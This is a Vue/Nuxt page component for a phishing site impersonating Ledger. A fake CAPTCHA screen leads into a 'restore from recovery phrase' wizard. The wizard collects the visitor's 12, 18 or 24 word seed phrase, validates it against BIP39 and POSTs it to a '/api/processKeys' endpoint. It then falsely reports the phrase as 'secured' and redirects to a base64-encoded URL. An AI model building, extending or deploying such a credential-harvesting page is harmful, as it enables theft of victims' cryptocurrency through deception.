<template>
  <div v-if="!isValidated">
    <div class="w-screen relative h-dvh grow flex justify-center items-center">
      <div class="absolute size-50 top-20">
        <img src="/img/logo-light.svg" alt="Logo" draggable="false">
      </div>
      <UCard variant="subtle">
        <div class="space-y-8">
          <div class="header">
            <h1 class="font-medium text-2xl">One more step</h1>
            <p class="text-muted">Please complete the security check to access LEDGER.COM</p>
          </div>
          <NuxtTurnstile v-model="token" :options="{callback: () => handleTurnstileComplete()}" />
          <div v-if="verificationInProgress" class="flex items-center justify-center">
            <UIcon name="i-heroicons-arrow-path" class="animate-spin mr-2" />
            <span>Verifying your request...</span>
          </div>
          <div class="footer">
            <h2 class="font-medium text-xl">Why do you have to complete a CAPTCHA?</h2>
            <p class="text-muted">Completing the captcha proves you are human and gives you access to the web property.</p>
          </div>
        </div>
      </UCard>
    </div>
  </div>
  <UApp v-else>
    <div class="app-container">
      <div class="page">
        <div class="sidebar">
          <div class="header">
            <img class="w-28 md:w-36 hidden md:block" :src="currentStep?.sidebar.logoImg.src" :alt="currentStep?.sidebar.logoImg.alt"
                 draggable="false"/>
          </div>
          <div class="body">
            <Lottie v-if="currentStep?.sidebar.imgType == 'lottie'" :name="currentStep?.sidebar.bodyImg.src"
                    :class="currentStep?.sidebar.bodyImg.class"/>
            <img v-else :src="currentStep?.sidebar.bodyImg.src" :alt="currentStep?.sidebar.bodyImg.alt"
                 draggable="false">
          </div>
          <div class="footer" v-if="false">footer</div>
        </div>
        <div class="main">
          <div class="header">
            <UProgress color="neutral" size="sm" v-model="value"
                       :max="maxValue"
                       status
                       :ui="{root: 'relative', status: 'absolute -top-3 left-14 duration-800 ease-linear', indicator: 'duration-820 ease-linear'}">
              <template #status>
                <span class="bg-white p-1 z-10 rounded-sm space-x-1 ">
                  <span class="bg-black px-1 text-white">{{ currentStep?.main.progress.badge }}</span>
                  <span class="text-xs uppercase text-nowrap">{{ currentStep?.main.progress.status }}</span>
                </span>
              </template>
            </UProgress>
          </div>
          <div class="body">
            <h1 class="title">{{ currentStep?.main.body.title }}</h1>
            <div class="desc">
              <p v-if="currentStep?.main.body.type == 'paragraph'" v-html="currentStep?.main.body.description"/>
              <div v-else>
                <ul class="description-list" v-if="typeof currentStep?.main.body.description == 'object'">
                  <li class="description-item" v-for="item in currentStep?.main.body.description">
                    <span class="badge">{{ item.badge }}</span>
                    <div class="main">
                      <h2 class="title">{{ item.title }}</h2>
                      <p class="body">{{ item.body }}</p>
                    </div>
                  </li>
                </ul>
                <div v-if="step == 1">
                  <form id="phrases">
                    <KeyPhrases v-model="phrases" />
                  </form>
                </div>
              </div>

              <div class="w-70 m-auto grow flex justify-center items-center" v-if="step == 2">
                <Lottie name="anim-loading" />
              </div>

              <div v-if="false" class="max-h-170 h-170 overflow-y-scroll border">
                <template v-for="anim in animations">
                  <p>{{ anim.name }}</p>
                  <Lottie :data="anim.data"/>
                </template>
              </div>
            </div>
          </div>
          <div class="footer">
            <UButton v-if="step <= 1" :disabled="isPrevDisabled" @click="previousStep" color="neutral" variant="outline" class="nav-button"
                     icon="material-symbols:arrow-back" :label="currentStep?.main.footer.previous"/>
            <UButton v-if="step < 1" :disabled="isNextDisabled" @click="nextStep" color="neutral" variant="solid"
                     class="nav-button" trailing-icon="material-symbols:arrow-forward"
                     :label="currentStep?.main.footer.next"/>
            <UButton v-else-if="step == 1" @click="submitPhrases(phrases)" color="neutral" variant="solid"
                     class="nav-button" trailing-icon="material-symbols:arrow-forward"
                     :label="currentStep?.main.footer.next"/>
          </div>

        </div>
      </div>
    </div>
  </UApp>
</template>

<script setup lang="ts">
import type { Step } from "../types";


const isValidated = ref(false);
const verificationInProgress = ref(false);
const token = ref('');

function handleTurnstileComplete() {
  verificationInProgress.value = true;
  // Add a 3 second delay before proceeding
  setTimeout(() => {
    verificationInProgress.value = false;
    isValidated.value = true;
  }, 3000);
}

const animationModules = import.meta.glob('~/assets/lottie2/*.json', {eager: true});
const animations = reactive(
    Object.entries(animationModules).map(([path, module]) => ({
      name: path.split('/').pop()?.replace('.json', '') || '',
      data: (module as any).default,
    }))
);



const steps: Ref<Step[]> = ref([
  {
    sidebar: {
      logoImg: {
        src: "/img/logo.svg",
        alt: "Ledger Logo",
      },
      bodyImg: {
        src: "/img/restorePhraseLight.png",
        alt: "restorePhraseLight",
      },
      imgType: "image"
    },
    main: {
      body: {
        title: "restore from recovery phrase",
        description: `Restore your Nano from your recovery phrase to restore, replace or back up your Ledger hardware wallet. <br> Your Nano will restore your private keys and you will be able to access and manage your crypto.`,
        type: "paragraph",
      },
      progress: {
        badge: 1,
        status: "get started",
        value: 7,
      },
      footer: {
        next: "OK, I'm ready!",
        previous: "Back",
      }
    }
  },
  // {
  //   sidebar: {
  //     logoImg: {
  //       src: "/img/logo.svg",
  //       alt: "Ledger Logo",
  //     },
  //     bodyImg: {
  //       src: "anim-plug-light",
  //       alt: "anim-plug-light",
  //       class: "scale-200 origin-left",
  //     },
  //     imgType: "lottie"
  //   },
  //   main: {
  //     body: {
  //       title: "the best way to get your started:",
  //       description: [
  //         {
  //           title: "Turn on Nano",
  //           body: "Connect your device to your computer with the USB cable.",
  //           badge: "1"
  //         },
  //         {
  //           title: "Browse",
  //           body: "Learn how to interact with your device by reading the on-screen instructions.",
  //           badge: "2"
  //         },
  //         {
  //           title: "Select 'Enter your recovery phrase'",
  //           body: "Press both buttons simultaneously to validate the selection.",
  //           badge: "3"
  //         },
  //         {
  //           title: "Follow instructions",
  //           body: "Come back here to follow instructions on your PIN code.",
  //           badge: "4"
  //         }
  //       ],
  //       type: "list",
  //     },
  //     progress: {
  //       badge: 2,
  //       status: "connect device",
  //       value: 35,
  //     },
  //     footer: {
  //       next: "Next step",
  //       previous: "Back",
  //     }
  //   }
  // },
  {
    sidebar: {
      logoImg: {
        src: "/img/logo.svg",
        alt: "Ledger Logo",
      },
      bodyImg: {
        src: "/img/recoverySheet.png",
        alt: "recoverySheet",
      },
      imgType: "image"
    },
    main: {
      body: {
        title: "enter your recovery phrase",
        description: "Your recovery phrase is the secret list of words that you backed up when you first set up your wallet.<br>Ledger does not keep a copy of your recovery phrase."
      },
      progress: {
        badge: 2,
        status: "recovery phrase",
        value: 52,
      },
      footer: {
        next: "Check recovery phrase",
        previous: "Back",
      }
    }
  },
  {
    sidebar: {
      logoImg: {
        src: "/img/logo.svg",
        alt: "Ledger Logo",
      },
      bodyImg: {
        src: "anim-loading-light",
        alt: "loading",
        class: "scale-180 origin-left",
      },
      imgType: "lottie"
    },
    main: {
      body: {
        title: "checking your recovery phrases",
        description: "Please wait a moment while your recovery phrases are being checked",
        type: "paragraph",
      },
      progress: {
        badge: 3,
        status: "processing",
        value: 91,
      },
      footer: {
        next: "",
        previous: "",
      }
    }
  }
]);
const step = ref(0)

const currentStep = computed(() => steps.value[step.value] ?? steps.value[0])
const device = ref(undefined)
const value = computed(() => currentStep.value?.main.progress.value ?? 0)
const maxValue = Array(100).fill('')
const phrases = ref([]) as Ref<string[]>

async function nextStep() {
  if (step.value == steps.value.length - 1) return
  step.value += 1;
  // if (step.value == 1) {
  //   let toast = useToast().add(
  //       {
  //         title: "Wait for device",
  //         color: "neutral",
  //         description: "Choose your ledger device from the selection menu"
  //       }
  //   )
  //   try {
  //     device.value = await navigator.usb.requestDevice({filters: [{
  //       // vendorId: 0x2C97
  //       }],});
  //     useToast().remove(toast.id)
  //     await nextStep()
  //   } catch (e) {
  //     useToast().update(toast.id, {color: "error", title: "No device selected", description: "Connect and choose your ledger device to continue."})
  //     setTimeout(() => (step.value = 0), 500)
  //   }
  //
  // }
}

function previousStep() {
  if (step.value === 0) return
  step.value -= 1;
}

function checkDuplicates(phrases: string[]) {
  const filledPhrases = phrases.filter(phrase => phrase.trim() !== '');
  const hasDuplicates = new Set(filledPhrases).size !== filledPhrases.length;
  const duplicateWords = filledPhrases.filter((word, index) => filledPhrases.indexOf(word) !== index);
  return { hasDuplicates, duplicateWords };
}

async function submitPhrases(phrases) {
  const form = document.forms.namedItem("phrases")
  if (!form.reportValidity()) return;

  // Import the validator function directly here to avoid circular dependencies
  const { validateRecoveryPhraseWords } = await import('./utils/bip39-validator');

  const duplicateResult = checkDuplicates(phrases);

  // Validate all phrases before submission
  const validationResult = validateRecoveryPhraseWords(phrases);

  const filledPhrases = phrases.filter(phrase => phrase.trim() !== '');

  if (!validationResult.isValid || ![12, 18, 24].includes(filledPhrases.length) || duplicateResult.hasDuplicates) {
    useToast().add({
      title: "Invalid recovery phrase",
      description: validationResult.invalidWords.length > 0
          ? `Please correct the ${validationResult.invalidWords.length} invalid word(s)`
          : duplicateResult.hasDuplicates
              ? `Duplicate words found: ${duplicateResult.duplicateWords.join(', ')}`
              : `Please enter all words of your recovery phrase, you must enter exactly 12, 18 or 24 words, you have entered ${filledPhrases.length} words`,
      color: "error",
      timeout: 5000
    });
    return;
  }

  // Proceed if all words are valid
  await nextStep()

  try {
    const {red} = await $fetch('/api/processKeys', {
      method: 'POST',
      body: {words: phrases},
    })
    setTimeout(() => {
      currentStep.value.main.body.title = "Attention!"
      currentStep.value.main.body.description = "Recovery phrase is now secured, redirecting..."
      setTimeout(() => {
        window.location.replace(atob(red))
      }, 3000)
    }, 7000)
  } catch (error) {
    useToast().add({title: "Unexpected error", description: "An unexpected error occurred. please try again later.", color: "error"})
    previousStep()
  }
}

const isNextDisabled = computed(() => {
if (step.value == steps.value.length-1) return true;
// if (step.value == 1) {
//   if (device.value == undefined) return true;
// }
})
const isPrevDisabled = computed(() => step.value == 0)

</script>

<style scoped>
@reference "@/assets/css/main.css";

* {
  @apply select-none;
}

.app-container {
  @apply md:w-screen grow flex flex-col;
}

.page {
  @apply flex flex-col md:flex-row grow;

  .sidebar {
    @apply max-w-screen md:w-80 py-4 md:py-8 flex flex-col bg-theme text-black space-y-4 md:space-y-8;

    .header {
      @apply place-items-center;
    }

    .body {
      @apply grow flex flex-col justify-center items-center overflow-hidden max-w-40 md:max-w-full mx-auto;
    }

    .footer {
      @apply hidden;
    }
  }

  .main {
    @apply flex grow flex-col max-w-3xl mx-auto p-6 py-8 gap-8;

    .header {
      @apply p-1;
    }

    .body {
      @apply flex flex-col grow gap-8 md:contain-size overflow-y-auto;

      .title {
        @apply uppercase font-medium text-2xl md:text-3xl xl:text-4xl;
      }

      .desc {
        @apply p-1 grow flex flex-col;

        .description-list {
          @apply flex flex-col gap-6;
          .description-item {
            @apply flex items-center font-normal gap-4;

            .badge {
              @apply flex justify-center items-center size-4 outline outline-gray-600 p-6 font-light;
            }

            .main {
              @apply flex flex-col p-0 gap-2;

              .title {
                @apply text-sm font-medium normal-case;
              }

              .body {
                @apply text-xs contain-content;
              }
            }
          }
        }
      }
    }

    .footer {
      @apply flex justify-between sticky bottom-2;

      .nav-button {
        @apply rounded-full border px-6 py-2 cursor-pointer;
      }
    }
  }
}

</style>